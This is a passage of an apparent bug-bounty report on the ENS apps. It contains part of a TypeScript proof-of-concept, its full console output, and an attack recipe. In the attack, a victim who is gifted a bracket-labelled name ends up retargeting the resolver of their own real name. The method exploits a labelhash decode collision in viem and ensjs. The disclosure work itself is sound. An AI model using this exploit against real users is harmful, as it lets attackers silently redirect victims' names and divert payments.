const attackerHasRoleOnV = await chain.call({ to: registry, abi: c.abi, fn: 'hasRoles', args: [vLabelhash, 1n << 24n, ATTACKER] })
kv('hasRoles(bracketTrueId, ROLE_SET_RESOLVER, attacker)', giftOwnerHasRole)
kv('hasRoles(labelhash(V), ROLE_SET_RESOLVER, attacker)', attackerHasRoleOnV)
if (!giftOwnerHasRole) throw new Error('attacker did not get the role on their own gift')
if (attackerHasRoleOnV) throw new Error('attacker unexpectedly holds a role on V')
let controlReverted = false
try {
  await chain.send({ from: ATTACKER, to: registry, abi: c.abi, fn: 'setResolver', args: [vCanonical, ATTACKER] })
} catch (e) {
  if (!(e instanceof RevertError)) throw e
  controlReverted = true
  say(`  ATTACKER.setResolver(canonicalId(V), attacker) -> REVERTED: ${e.message}`)
}
if (!controlReverted) throw new Error('control failed: attacker could already retarget V directly')
say()
say('  >> The attacker holds zero roles on V. Whatever happens next is')
say('     created by the decode collision, not by authority the attacker')
say('     already had.')

act('ACT 7', "THE GATE: change-resolver.tsx's own role check passes for the victim, on the gift's page")
// change-resolver.tsx:48-58 computes resource the same way hasRoles.js:70 does:
// BigInt(labelhash(label)), here label is the bracket string off the route.
const gateResource = BigInt(labelhash(bracketLabel))
const victimGatePasses = await chain.call({ to: registry, abi: c.abi, fn: 'hasRoles', args: [gateResource, 1n << 24n, VICTIM] })
kv('gate resource (labelhash(bracketLabel))', `0x${gateResource.toString(16)}`)
kv('hasRoles(gateResource, ROLE_SET_RESOLVER, victim)', victimGatePasses)
if (!victimGatePasses) throw new Error('premise broken: the gate did not pass for the victim')
say()
say('  >> True. The gate decodes onto labelhash(V), the resource the victim')
say('     already holds ROLE_SET_RESOLVER on from registering V. No')
say('     "Permission Denied" screen. The app renders the real form.')

act('ACT 8', "THE ATTACK: ACT 4's real calldata, signed by the victim on the gift's page")
const beforeV = await chain.call({ to: registry, abi: c.abi, fn: 'getResolver', args: [vLabelhash] })
const beforeGift = await chain.call({ to: registry, abi: c.abi, fn: 'getResolver', args: [bracketTrueId] })
await chain.raw({ from: VICTIM, to: registry, data: attackCalldata, abi: c.abi })
const afterV = await chain.call({ to: registry, abi: c.abi, fn: 'getResolver', args: [vLabelhash] })
const afterGift = await chain.call({ to: registry, abi: c.abi, fn: 'getResolver', args: [bracketTrueId] })
if (afterV.toLowerCase() !== GIFT_TYPED_RESOLVER.toLowerCase()) throw new Error('V was not retargeted')
if (afterGift !== '0x0000000000000000000000000000000000000000') throw new Error('gift resolver was touched')

act('ACT 9', "RECOVERY: the victim's own ordinary Change-resolver flow restores V, one transaction")
const recoverCalldata = buildSetResolverCalldata(V_NAME, V_ORIGINAL_RESOLVER)
await chain.raw({ from: VICTIM, to: registry, data: recoverCalldata, abi: c.abi })
const recoveredV = await chain.call({ to: registry, abi: c.abi, fn: 'getResolver', args: [vLabelhash] })
if (recoveredV.toLowerCase() !== V_ORIGINAL_RESOLVER.toLowerCase()) throw new Error('recovery failed')
say(`  ${V_NAME} resolver restored to ${short(V_ORIGINAL_RESOLVER)} in one ordinary transaction.`)

say()
rule('-')
say('  LEDGER (resolver address, read from the EVM state trie)')
rule('-')
say('    name                        before                          after')
say(`    ${V_NAME.padEnd(27)} ${short(beforeV)}   ${short(afterV)}`)
say(`    ${bracketName.slice(0, 16) + '...'.padEnd(11)} ${short(beforeGift)}   ${short(afterGift)}`)
rule('-')
say()
say(`  >> V.resolver, victim-owned, real name, went from ${short(V_ORIGINAL_RESOLVER)}`)
say(`     to ${short(GIFT_TYPED_RESOLVER)}, the address the victim typed while looking`)
say('     at the gift\'s own page. The gift\'s own resolver stayed unset the')
say('     whole time. The victim never touched V\'s Resolver tab.')
say()
say('  PoC PASSED, every assertion held.')
say()
```

### Output

```
==============================================================================
  ENS PoC: Change-resolver flow decodes a bracket label instead of
           hashing it, and retargets a different, real name's resolver
  repo:  G:\My Drive\hunter\hunt_data\ens\ens-apps
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-changeresolver-retarget
==============================================================================

Installing pinned deps (viem 2.52.2, ensjs @e96662c, solc 0.8.28)...
Progress: resolved 1, reused 0, downloaded 0, added 0
Progress: resolved 58, reused 31, downloaded 0, added 0
Progress: resolved 88, reused 62, downloaded 0, added 0
Packages: +67
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Progress: resolved 93, reused 67, downloaded 0, added 26
Progress: resolved 93, reused 67, downloaded 0, added 46
Progress: resolved 93, reused 67, downloaded 0, added 60
Progress: resolved 93, reused 67, downloaded 0, added 62
Progress: resolved 93, reused 67, downloaded 0, added 66
Progress: resolved 93, reused 67, downloaded 0, added 67
Progress: resolved 93, reused 67, downloaded 0, added 67, done

dependencies:
+ @ensdomains/ensjs 5.0.0-alpha.1
+ @ensdomains/ensjs-abi 5.0.0-alpha.1
+ @ethereumjs/common 4.4.0 (10.1.3 is available)
+ @ethereumjs/evm 3.1.1 (10.1.3 is available)
+ @ethereumjs/statemanager 2.4.0 (10.1.3 is available)
+ @ethereumjs/util 9.1.0 (10.1.3 is available)
+ solc 0.8.28 (0.8.36 is available)
+ viem 2.52.2 (2.56.3 is available)

devDependencies:
+ tsx 4.23.13

Done in 15.5s using pnpm v9.15.9

==============================================================================
  ACT 1  viem's own labelhash() decodes a bracket label instead of hashing it
==============================================================================
    labelhash("r62vaultfinal1")      0x1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce0f45851c
    bracket label built from it      [1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce0f45851c]
    labelhash(bracketLabel)          0x1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce0f45851c

  >> Identical. viem/utils/ens/labelhash.js:14-18 tries
     encodedLabelToLabelhash() first (labelhash.js:14-18,
     encodedLabelToLabelhash.js:2-13), which reads the 64 hex characters
     between [ and ] straight out, before it ever tries keccak256.

    keccak256(bytes(bracketLabel))   0x588862c6e4d4d9810d5b44570c17bfc50b982011e6d04e145871b5f815a5d0a4
  >> Different. This is the identity the CHAIN actually assigns the gift
     when the attacker registers it. The two identities of the same
     on-screen row diverge here.

==============================================================================
  ACT 2  The registry's own delegable role list includes ROLE_SET_RESOLVER
==============================================================================
    keys                           ROLE_SET_SUBREGISTRY, ROLE_SET_RESOLVER, ROLE_RENEW, ROLE_REGISTRAR, ROLE_REGISTER_RESERVED, ROLE_SET_PARENT

  >> apps/portal/src/lib/roles/permissions.ts:71-108, the same six-entry
     "Add User" checkbox list the sibling delete finding cites. Owning a
     name grants this role on that name's own resource by default; it
     does not need to be explicitly delegated for this attack to work.

==============================================================================
  ACT 3  The real pinned labelToCanonicalId collapses both labels onto one resource id
==============================================================================
    labelToCanonicalId("r62vaultfinal1") 0x1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce00000000
    labelToCanonicalId(bracketLabel) 0x1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce00000000

  >> ensjs dist/utils/v2/registry/labelToCanonicalId.js:2-6, the exact
     function changeResolver.ts:71 calls. Same resource id either way.

==============================================================================
  ACT 4  THE REAL CALLDATA: changeResolver.ts's own 3 lines, run on the bracket name
==============================================================================
    buildSetResolverCalldata(bracketName, ...) 0xbc7b6d62...68bb50
    real mined tx calldata (block 11667082) 0xbc7b6d62...68bb50

  >> Byte for byte identical to tx
     0xd1d051f2dd2c4fae2dc7d4ad26a4c0a08bbec0810c8b93578a1d472f625827f3,
     block 11667082 (evidence/FORENSICS.txt), produced by the same three
     lines the shipped app runs, from a label that looks like a gift
     with no resolver, on screen.

==============================================================================
  ACT 5  Local EVM: victim deploys the registry, registers V, sets its original resolver
==============================================================================
    PermissionedRegistryModel        0x5fbdb2315678afecb367f032d93f642f64180aa3
  r62vaultfinal1.eth registered to VICTIM; resolver set to 0x23f45D32...1e14c2
  (an ordinary "Register" + "Change resolver", using this same buildSetResolverCalldata)

==============================================================================
  ACT 6  Attacker registers the gift at its TRUE on-chain id, then CONTROL: direct retarget of V reverts
==============================================================================
    hasRoles(bracketTrueId, ROLE_SET_RESOLVER, attacker) true
    hasRoles(labelhash(V), ROLE_SET_RESOLVER, attacker) false
  ATTACKER.setResolver(canonicalId(V), attacker) -> REVERTED: Unauthorized(0x1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce00000000, 0x70997970C51812dc3A010C7d01b50e0d17dc79C8, 0x1000000)

  >> The attacker holds zero roles on V. Whatever happens next is
     created by the decode collision, not by authority the attacker
     already had.

==============================================================================
  ACT 7  THE GATE: change-resolver.tsx's own role check passes for the victim, on the gift's page
==============================================================================
    gate resource (labelhash(bracketLabel)) 0x1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce0f45851c
    hasRoles(gateResource, ROLE_SET_RESOLVER, victim) true

  >> True. The gate decodes onto labelhash(V), the resource the victim
     already holds ROLE_SET_RESOLVER on from registering V. No
     "Permission Denied" screen. The app renders the real form.

==============================================================================
  ACT 8  THE ATTACK: ACT 4's real calldata, signed by the victim on the gift's page
==============================================================================

==============================================================================
  ACT 9  RECOVERY: the victim's own ordinary Change-resolver flow restores V, one transaction
==============================================================================
  r62vaultfinal1.eth resolver restored to 0x23f45D32...1e14c2 in one ordinary transaction.

------------------------------------------------------------------------------
  LEDGER (resolver address, read from the EVM state trie)
------------------------------------------------------------------------------
    name                        before                          after
    r62vaultfinal1.eth          0x23f45D32...1e14c2   0x82c6f4E3...68Bb50
    [1ec8b3414369488...         0x00000000...000000   0x00000000...000000
------------------------------------------------------------------------------

  >> V.resolver, victim-owned, real name, went from 0x23f45D32...1e14c2
     to 0x82c6f4E3...68Bb50, the address the victim typed while looking
     at the gift's own page. The gift's own resolver stayed unset the
     whole time. The victim never touched V's Resolver tab.

  PoC PASSED, every assertion held.
```

`r62vaultfinal1.eth`, the victim's real name, moved from resolver `0x23f45D320E890ADbEdaD7ad71Aa1FB84cD1e14c2` to `0x82c6f4E3BB908DefA1F9c8157F09F8CEae68Bb50`. The gift's own resolver, indexed at its true on-chain identity, stayed `0x0` the entire run.

## Attack code

```ts
// 1. Attacker registers an ordinary 2LD whose label is the bracket form of
//    labelhash(V): "[1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce0f45851c]"
//    On chain this label hashes to a value that has nothing to do with V.
```

```ts
// 2. Attacker gifts it to the victim: safeTransferFrom(attacker, victim, giftTokenId, 1, "0x")
//    No consent, no victim transaction, no role of any kind.
```

```ts
// 3. Victim opens the gift's Resolver tab. The app itself renders:
//    "This name does not have a resolver set."          [Set resolver]
```

```ts
// 4. change-resolver.tsx:48-58 checks the role gate on the bracket label,
//    which decodes onto V and passes because the victim owns V:
getHasRolesQueryOptions({ registryAddress, label: bracketLabel, roles: ['ROLE_SET_RESOLVER'], account: victim })
```

```ts
// 5. Victim types a resolver address, clicks "Save changes", signs.
//    changeResolver.ts:70-77 computes the argument:
labelToCanonicalId('[1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce0f45851c]')
// == labelToCanonicalId('r62vaultfinal1')  ==  canonicalId(V)
```

```
// 6. V's resolver moves to the address the victim typed. The gift's own
//    resolver, at its true chain identity, was never touched.
```

```
plant : gift a 2LD whose label is "[" + hex(labelhash(V)) + "]"
fire  : the victim clicks "Set resolver" on that gift's page
```
